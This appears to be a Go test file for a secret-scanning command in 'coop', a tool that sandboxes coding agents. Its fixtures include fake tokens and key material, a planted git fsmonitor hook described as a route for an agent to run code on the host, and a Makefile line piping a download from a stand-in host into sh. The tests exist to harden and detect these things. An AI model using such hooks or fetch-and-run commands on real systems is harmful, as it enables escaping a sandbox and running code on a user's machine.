package cli

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/AndrewDryga/coop/internal/config"
	"github.com/AndrewDryga/coop/internal/testutil/gitrepo"
)

// pinGitConfig closes both git config doors in the PROCESS environment, which the fixture repo
// (gitrepo.New pins its own runner) does not do for the code under test: candidateFiles shells out
// to `git ls-files --exclude-standard` with the ambient environment, so a developer's
// core.excludesFile would change which files these tests see as gitignored.
// See .agent/kb/rules/hermetic-git-tests.md.
func pinGitConfig(t *testing.T) {
	t.Helper()
	t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(t.TempDir(), "noglobal"))
	t.Setenv("GIT_CONFIG_SYSTEM", filepath.Join(t.TempDir(), "nosystem"))
}

// joinScan renders a scan the way the old string-returning scanner did, so these tests keep
// asserting on "which file, flagged how" rather than on the report's layout.
func joinScan(scan treeScan) string {
	var b strings.Builder
	for _, f := range scan.findings {
		fmt.Fprintf(&b, "%s:%d (%s)", f.Path, f.Line, f.Kind)
		if f.shadowed {
			b.WriteString(" - git would commit it")
		}
		b.WriteString("\n")
	}
	return b.String()
}

func TestScanVisibleTreeSkipsGitignored(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	pinGitConfig(t)
	repo, _ := gitrepo.New(t) // no further fixture git commands; the files below are enough
	token := `api_key = "aB3xK9mP2qL7vR4tY8wZ1cF6nH5jD0sUvWx"`
	mk := func(rel, content string) {
		t.Helper()
		full := filepath.Join(repo, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	mk(".gitignore", "serviceAccount.json\n")
	mk("serviceAccount.json", token) // gitignored but not shadowed → visible to the agent
	mk("config.tf", token)           // tracked-able source → must be scanned

	// Default mode: the gitignored file is out of the commit-candidate set.
	scan, err := scanVisibleTree(repo, false)
	if err != nil {
		t.Fatal(err)
	}
	joined := joinScan(scan)
	if strings.Contains(joined, "serviceAccount.json") {
		t.Errorf("default scan should skip the gitignored file:\n%s", joined)
	}
	if !strings.Contains(joined, "config.tf") {
		t.Errorf("missed the secret in the tracked file:\n%s", joined)
	}

	// --include-ignored: the box can see the gitignored file (whole tree is mounted), so flag it.
	ignored, err := scanVisibleTree(repo, true)
	if err != nil {
		t.Fatal(err)
	}
	if j := joinScan(ignored); !strings.Contains(j, "serviceAccount.json") {
		t.Errorf("--include-ignored should scan the gitignored file:\n%s", j)
	}
}

// TestScanVisibleTreeIncludeIgnoredSkipsShadowedAndDeps: even in --include-ignored mode, a
// shadowed secret (.env) stays skipped and dependency dirs aren't walked.
func TestScanVisibleTreeIncludeIgnoredSkipsShadowedAndDeps(t *testing.T) {
	repo := t.TempDir()
	token := "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
	mk := func(rel, content string) {
		t.Helper()
		full := filepath.Join(repo, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	mk(".env", "GH="+token+"\n")                // shadowed → never scanned, either mode
	mk("node_modules/pkg/index.js", "x="+token) // dependency dir → pruned
	mk("secrets.txt", "token: "+token+"\n")     // plain visible file → flagged

	scan, err := scanVisibleTree(repo, true)
	if err != nil {
		t.Fatal(err)
	}
	joined := joinScan(scan)
	if strings.Contains(joined, ".env") {
		t.Errorf("shadowed .env must stay skipped in --include-ignored mode:\n%s", joined)
	}
	if strings.Contains(joined, "node_modules") {
		t.Errorf("dependency dirs must be pruned:\n%s", joined)
	}
	if !strings.Contains(joined, "secrets.txt") {
		t.Errorf("missed the token in a visible file:\n%s", joined)
	}
}

func TestScanVisibleTree(t *testing.T) {
	repo := t.TempDir()
	mk := func(rel, content string) {
		t.Helper()
		full := filepath.Join(repo, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	// A token in an ordinary (non-shadowed) file → the box sees it, so flag it.
	mk("config/prod.yml", "host: db\ntoken: ghp_abcdefghijklmnopqrstuvwxyz0123456789\n")
	// The same shape in a shadowed .env → the box never sees it, so don't flag it.
	mk(".env", "GH=ghp_zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\n")
	// A clean file → no finding.
	mk("README.md", "nothing secret here\n")

	scan, err := scanVisibleTree(repo, false)
	if err != nil {
		t.Fatal(err)
	}
	joined := joinScan(scan)
	if !strings.Contains(joined, "config/prod.yml") {
		t.Errorf("missed the token in the visible config/prod.yml:\n%s", joined)
	}
	if strings.Contains(joined, ".env") {
		t.Errorf("flagged a secret in the shadowed .env (the box can't see it):\n%s", joined)
	}
	if strings.Contains(joined, "README.md") {
		t.Errorf("false positive on a clean file:\n%s", joined)
	}
}

func TestUnscannedIgnoredCount(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	pinGitConfig(t)
	repo, run := gitrepo.New(t)
	run("commit", "-q", "--allow-empty", "-m", "base")
	mk := func(rel, content string) {
		t.Helper()
		full := filepath.Join(repo, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	mk(".gitignore", "secret.txt\n.env\n.agent/*\n")
	mk("secret.txt", "x")             // gitignored, NOT shadowed → box-visible blind spot → counts
	mk(".env", "x")                   // gitignored AND shadowed → protected → must NOT count
	mk(".agent/state.md", "x")        // coop's .agent/ state → scanned by default → not "unscanned"
	mk(".agent/tasks/t/task.md", "x") // ditto, nested → scanned by default, not counted
	mk("tracked.go", "x")             // committed → in the default scan → not counted
	run("add", ".gitignore", "tracked.go")
	run("commit", "-qm", "add")

	if n := unscannedIgnoredCount(repo); n != 1 {
		t.Errorf("unscannedIgnoredCount = %d, want 1 (only secret.txt; .env shadowed, .agent/* now scanned by default, tracked.go committed)", n)
	}
}

// .agent/ is coop's gitignored working state, but the box reads it — so a secret pasted into an
// agent note/log there must be caught by the DEFAULT scan, not hidden behind --include-ignored.
func TestScanVisibleTreeScansAgentByDefault(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	pinGitConfig(t)
	repo, run := gitrepo.New(t)
	run("commit", "-q", "--allow-empty", "-m", "base")
	mk := func(rel, content string) {
		t.Helper()
		full := filepath.Join(repo, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	mk(".gitignore", ".agent/*\n!.agent/kb/rules/\n")
	mk(".agent/tasks/2026-01-01-x/log.md", "pasted token: ghp_abcdefghijklmnopqrstuvwxyz0123456789\n")
	run("add", ".gitignore")
	run("commit", "-qm", "init")

	scan, err := scanVisibleTree(repo, false) // DEFAULT scan, no --include-ignored
	if err != nil {
		t.Fatal(err)
	}
	if j := joinScan(scan); !strings.Contains(j, ".agent/tasks/2026-01-01-x/log.md") {
		t.Errorf("default scan must catch a secret in .agent/ (the box reads it):\n%s", j)
	}
}

func TestReadScannable(t *testing.T) {
	dir := t.TempDir()
	root, err := os.OpenRoot(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer root.Close()
	text := filepath.Join(dir, "a.txt")
	os.WriteFile(text, []byte("plain text\n"), 0o644)
	if s, status := readScannable(root, "a.txt"); status.kind != scanRead || s == "" {
		t.Errorf("text file should be scannable, got kind=%v", status.kind)
	}
	bin := filepath.Join(dir, "b.bin")
	os.WriteFile(bin, []byte("PNG\x00\x01\x02binary"), 0o644)
	if _, status := readScannable(root, "b.bin"); status.kind != scanSkipped {
		t.Errorf("binary file (NUL byte) should be skipped, got kind=%v", status.kind)
	}
	large := filepath.Join(dir, "large.txt")
	if err := os.WriteFile(large, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Truncate(large, maxScanBytes+1); err != nil {
		t.Fatal(err)
	}
	if _, status := readScannable(root, "large.txt"); status.kind != scanSkipped {
		t.Errorf("oversized file should be skipped, got kind=%v", status.kind)
	}
	outside := filepath.Join(t.TempDir(), "outside.txt")
	if err := os.WriteFile(outside, []byte("ghp_abcdefghijklmnopqrstuvwxyz0123456789\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "outside-link")
	if err := os.Symlink(outside, link); err != nil {
		t.Fatal(err)
	}
	if content, status := readScannable(root, "outside-link"); status.kind != scanSkipped || content != "" {
		t.Errorf("outside symlink should be skipped, got status=%+v content=%q", status, content)
	}
}

// A poisoned core.fsmonitor must not fire when `coop check-secrets` enumerates files —
// candidateFiles runs `git ls-files`, which refreshes the index and so executes fsmonitor. The
// repo's .git is agent-writable, so this is a host-RCE vector if the call isn't hardened. The
// positive control fires with genuinely raw git, so a green test means the hardening works rather
// than that the trap is dead. (The fork/merge half of this guard lives in internal/forkctl.)
func TestCheckSecretsLsFilesIsHardened(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	pinGitConfig(t)
	repo, run := gitrepo.New(t)
	run("commit", "-q", "--allow-empty", "-m", "base")
	marker := filepath.Join(t.TempDir(), "PWNED")
	evil := filepath.Join(repo, ".git", "evil.sh")
	if err := os.WriteFile(evil, []byte("#!/bin/sh\necho pwned >> "+marker+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	run("config", "core.fsmonitor", evil)
	if _, _, err := candidateFiles(repo, false); err != nil { // hardened — must not run fsmonitor
		t.Fatalf("candidateFiles: %v", err)
	}
	if pathExists(marker) {
		t.Fatal("candidateFiles ran the parent's core.fsmonitor on the host")
	}
	_ = exec.Command("git", "-C", repo, "ls-files", "--cached", "--others", "--exclude-standard").Run() // raw control
	if !pathExists(marker) {
		t.Fatal("positive control failed: raw git ls-files did not fire the planted fsmonitor")
	}
}

// A file coop shadows by NAME (id_ed25519, *.pem) is hidden from the box, but that protects only
// the box: when git would commit it, the push leaks it just the same. The default scan therefore
// reports such commit candidates (tagged), including explicit .coopignore hides. A shadowed file
// git would not commit stays skipped in both modes.
func TestCheckSecretsReportsNameShadowedCommitCandidates(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	pinGitConfig(t)
	repo, _ := gitrepo.New(t)
	key := "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n-----END OPENSSH PRIVATE KEY-----\n"
	mk := func(rel, content string) {
		t.Helper()
		full := filepath.Join(repo, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	mk(".gitignore", "ignored.pem\n")
	mk(".coopignore", "silenced.pem\n")
	mk("id_ed25519", key)   // shadowed by name, untracked → git would commit it
	mk("silenced.pem", key) // explicitly hidden, but still a commit candidate
	mk("ignored.pem", key)  // shadowed by name AND gitignored → protected on both sides
	mk("key.txt", key)      // plain commit candidate → the control
	mk(".agent/tasks/notes/secret.key", key)

	scan, err := scanVisibleTree(repo, false)
	if err != nil {
		t.Fatal(err)
	}
	joined := joinScan(scan)
	if !strings.Contains(joined, "id_ed25519") || !strings.Contains(joined, "git would commit it") {
		t.Errorf("default scan missed the name-shadowed commit candidate:\n%s", joined)
	}
	if !strings.Contains(joined, "key.txt") {
		t.Errorf("default scan missed the control file:\n%s", joined)
	}
	if !strings.Contains(joined, "silenced.pem") || strings.Contains(joined, "ignored.pem") {
		t.Errorf("default scan must report hidden candidates but skip hidden noncandidates:\n%s", joined)
	}
	all, err := scanVisibleTree(repo, true)
	if err != nil {
		t.Fatal(err)
	}
	joined = joinScan(all)
	if strings.Contains(joined, "ignored.pem") {
		t.Errorf("--include-ignored reported a file the box never sees and git never commits:\n%s", joined)
	}
	if !strings.Contains(joined, "id_ed25519") || !strings.Contains(joined, "silenced.pem") {
		t.Errorf("--include-ignored dropped the name-shadowed commit candidate:\n%s", joined)
	}
}

// check-secrets also lists the changed files that alter what runs on your machine — a hook, the
// Makefile — with the reason, independent of the secret scan's verdict.
func TestCheckSecretsReportsHostSurfaceChanges(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	pinGitConfig(t)
	repo, git := gitrepo.New(t)
	mk := func(rel, content string) {
		t.Helper()
		full := filepath.Join(repo, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	mk("Makefile", "all:\n\ttrue\n")
	git("add", "Makefile")
	git("commit", "-qm", "base")
	mk("Makefile", "all:\n\tcurl -s https://example.invalid | sh\n")
	mk(".githooks/pre-commit", "#!/bin/sh\n")
	mk("main.go", "package main\n")
	surfaces := hostSurfacesChanged(repo)
	paths := map[string]string{}
	for _, finding := range surfaces {
		paths[finding.Path] = finding.Reason
	}
	if len(paths) != 2 || !strings.Contains(paths["Makefile"], "make") || !strings.Contains(paths[".githooks/pre-commit"], "Git operations") {
		t.Fatalf("host surfaces = %+v; want the modified Makefile and the new hook, not main.go", surfaces)
	}
	a := &app{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
	var code int
	var runErr error
	out := captureStderr(t, func() { code, runErr = a.cmdCheckSecrets(nil) })
	if code != 0 || runErr != nil {
		t.Fatalf("check-secrets = (%d, %v); the host-surface report must not change the exit code\n%s", code, runErr, out)
	}
	if !strings.Contains(out, "Review files that run commands") || !strings.Contains(out, ".githooks/pre-commit") {
		t.Fatalf("check-secrets did not report the host surfaces:\n%s", out)
	}
}
